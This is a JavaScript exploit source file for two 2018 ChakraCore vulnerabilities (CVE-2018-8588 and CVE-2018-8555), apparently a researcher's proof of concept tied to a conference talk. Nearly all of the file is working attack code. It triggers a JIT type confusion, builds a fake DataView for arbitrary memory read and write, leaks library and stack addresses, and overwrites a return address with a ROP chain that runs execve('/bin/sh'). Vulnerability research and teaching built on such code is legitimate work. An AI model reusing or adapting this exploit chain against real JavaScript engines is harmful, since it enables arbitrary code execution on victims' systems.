/*
 * Exploit for CVE-2018-8588 && CVE-2018-8555 by Jonathan Jacobi (@j0nathanj)
 * 
 * This exploits a Type Confusion due to a mismatch between the HasNoMissingValues flag,
 * and the contents of an array.
 *
 * The type confusion takes place in the JITed code - the mismatch causes a conversion of the prototype chain of the
 * argument given to Array.prototype.concat() to VarArrays (JavascriptArray). 
 * 
 * This conversion later leads to a Type Confusion.
 *
 * To exploit it, we fake a DataView object and corrupt its Buffer address.
 * After having an infoleak from the Type Confusion, we use the two and calculate Chakra's base address.
 * Then, we use the DataView's Buffer and using our arbitrary read primitive from it, we read a GOT entry from
 * Chakra.
 * We then know where libc is, and we use the environ pointer in libc to leak the location of the stack.
 *
 * Once we have a stack address, libc's base, chakra's base, and an arbitrary r/w primitive, 
 * we continue to execute code in ROP.
 *
 * To perform the ROP, we call String.prototype.slice() and we get our stack overwrite to take place from a 
 * callback originated in slice().
 * This allows us to know where a some return address will be, and we can overwrite it with our ROP chain.
 *
 * The exploit will most likely require changing offsets (Chakra offsets, libc offsets and stack offsets).
 * 
 *
 * Exploit environment:
 *    - Ubuntu 18.04.01 - 64 bit.
 *    - ChakraCore from GitHub, commit 565eee076ab89cff82c1b12f4c5bd8bf99d3ee78
 *
 * The talk ("From Zero to Zero Day" - 35C3) explaining this vulnerability can be found here:
 *              https://www.youtube.com/watch?v=xp1YDOtWohw 
 *
 */

var fake_object = new Array(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
var f64 = new Float64Array(1);
var i32 = new Int32Array(f64.buffer);
var array_addr_hi, array_addr_lo;
var dv;

// Uint32 to Int32
function u32_to_i32(x) {
    if (x >= 0x80000000) {
        return -(0x100000000 - x);
    }
    return x;
}

// Int32 to Uint32
function i32_to_u32(x) {
    if (x < 0) {
        return 0x100000000 + x;
    }
    return x;
}

function trigger(arr, buggy, object_arr) {
    let tmp = [1.1];
    
    arr[0] = 1.1;
    let res = tmp.concat(buggy); // "arr" got converted to VarArray but is treated as FloatArray
    object_arr[1] = fake_object; // "object_arr" is the VarArray form of arr 
    addr = arr[1]; // Read a pointer off as a float

    // Read the object's address (infoleak)
    f64[0] = addr; 
    var base_lo = i32[0], base_hi = i32[1];
    
    // Corrupt the element to point to fake_object's data
    i32[0] = base_lo + 0x58;

    arr[0] = f64[0];

    // Construct our fake DataView
    // vtable
    fake_object[0] = base_lo + 0x58 - 0xb0 + 0x20;  fake_object[1] = base_hi;
    // Type*
    fake_object[2] = base_lo + 0x68;         fake_object[3] = base_hi;
    // (TypeId for fake Type object)
    fake_object[4] = 56;                     fake_object[5] = 0;
    // (JavascriptLibrary* for fake Type object, +0x430 must be valid memory)
    fake_object[6] = base_lo + 0x58 - 0x430; fake_object[7] = base_hi;
    // Buffer size
    fake_object[8] = 0x200;                  fake_object[9] = 0;
    // ArrayBuffer pointer, +0x3C IsDetached
    fake_object[10] = base_lo + 0x58 - 0x20 + 20; fake_object[11] = base_hi;
    // Buffer address
    fake_object[14] = base_lo + 0x58;        fake_object[15] = base_hi;

    array_addr_hi = i32_to_u32(base_hi);
    array_addr_lo = i32_to_u32(base_lo);
}


function write32(addr_hi, addr_lo, value) {
    fake_object[14] = u32_to_i32(addr_lo);
    fake_object[15] = u32_to_i32(addr_hi);
    DataView.prototype.setInt32.call(dv, 0, value, true);
}

function read32(addr_hi, addr_lo) {
    fake_object[14] = u32_to_i32(addr_lo);
    fake_object[15] = u32_to_i32(addr_hi);
    return DataView.prototype.getInt32.call(dv, 0, true);
}

function read64(addr_hi, addr_low) {
    lower_dword  = read32(addr_hi, addr_low);
    higher_dword = read32(addr_hi, addr_low + 4);
    return {hi : higher_dword, lo : lower_dword };
}   

function print64(int64_value, message){
    print(message + '0x'+ i32_to_u32(int64_value.hi).toString(16) + i32_to_u32(int64_value.lo).toString(16));
}

function main() {
    MissingValue = 5.5627483035514150e-309; // == 0x00040002fff80002 (MisingValue when FLOATVAR is enabled)  
    
    for(let i = 0; i < 0x10000; i++){
        let tmp = [1.1, 2.2, 3.3];
        let otmp = [new Object(), new Object()];
        trigger(tmp, [1.1], otmp);
    }

    let buggy = [{},{}, {}, {}];
    let arr = [1.1, 2.2];
    arr.getPrototypeOf = Object.prototype.valueOf;  

    // Proxy to an array (`[]`) allows us to use Array.prototype.fill
    buggy.__proto__ = new Proxy([], arr);

    // Use Array.prototype.fill to set the MissingItem value.
    buggy.fill(MissingValue, 0, 1);
    
    trigger(arr, buggy, arr, fake_object);
    
    // Type Confusion infoleak
    var leak_int64 = { hi : array_addr_hi, lo : array_addr_lo };
    print64(leak_int64, '[*] Chakra leak @ ');
    dv = arr[0];
    
    // First QWORD is an address in Chakra's binary 
    var chakra_leak = read64(array_addr_hi, array_addr_lo);
    var chakra_leak_rebased = { hi : chakra_leak.hi, lo : chakra_leak.lo - 0x2fff0 };
    var chakra_base = { hi : chakra_leak_rebased.hi, lo: chakra_leak_rebased.lo - 0xd4e000 };
    print64(chakra_base, '[*] Chakra base @ ');
    
    // Read memset's GOT entry from Chakra's binary
    var memset_got  = { hi : chakra_base.hi, lo : chakra_base.lo + 0xDC4248};
    var memset_libc = read64(memset_got.hi, memset_got.lo);
    print64(memset_libc, "[*] memset() @ ");
    var libc_base = { hi : memset_libc.hi, lo : memset_libc.lo - 0x18ef50 };
    print64(libc_base, "[*] Libc base @ ");
    
    // Read the environ pointer to leak the stack
    var environ_pointer = { hi : libc_base.hi, lo : libc_base.lo + 0x3ee098 } ;
    print64(environ_pointer, "[*] environ @ ");
    var stack_addr = read64(environ_pointer.hi, environ_pointer.lo);
    print64(stack_addr, "[*] Stack address @ ");
    
    // Adjust the target RSP to hit a return address and allow us to ROP
    var rsp_value = { hi : stack_addr.hi, lo : stack_addr.lo - 0x1970 + 0x538 - 0x10*7 };
    print64(rsp_value, "[*] Return address @ ");
    
    // ROP related addresses
    var execve_addr = { hi : libc_base.hi, lo : libc_base.lo + 0xe4e30};
    print64(execve_addr, "[*] execve() @ ");
    var pop_rdi_ret = { hi : libc_base.hi, lo : libc_base.lo + 0x000000000002155f}; // pop rdi ; ret
    print64({hi : array_addr_hi, lo : array_addr_lo + 0x58 + 0x20 }, "[*] Writing \"/bin/sh\" @ ");
    
    // Write "/bin/sh" to memory for the execve() call
    write32(array_addr_hi, array_addr_lo + 0x58 + 0x24, 0x0068732f);
    write32(array_addr_hi, array_addr_lo + 0x58 + 0x20, 0x6e69622f);
    
    String.prototype.slice.call('', { valueOf : () => { // This will overwrite a return address from a 
                                                        // code path related to slice()
                                                        write32(rsp_value.hi, rsp_value.lo, pop_rdi_ret.lo);
                                                        write32(rsp_value.hi, rsp_value.lo + 4, pop_rdi_ret.hi);
                                                        write32(rsp_value.hi, rsp_value.lo + 8, array_addr_lo + 0x58 + 0x20);
                                                        write32(rsp_value.hi, rsp_value.lo + 12, array_addr_hi);
                                                        write32(rsp_value.hi, rsp_value.lo + 16, execve_addr.lo);
                                                        write32(rsp_value.hi, rsp_value.lo + 20, execve_addr.hi);
                                                        write32(rsp_value.hi, rsp_value.lo + 24, 0x41414141);
                                                        write32(rsp_value.hi, rsp_value.lo + 28, 0x41414141); 
                                                      }});  

}
    
main(); 
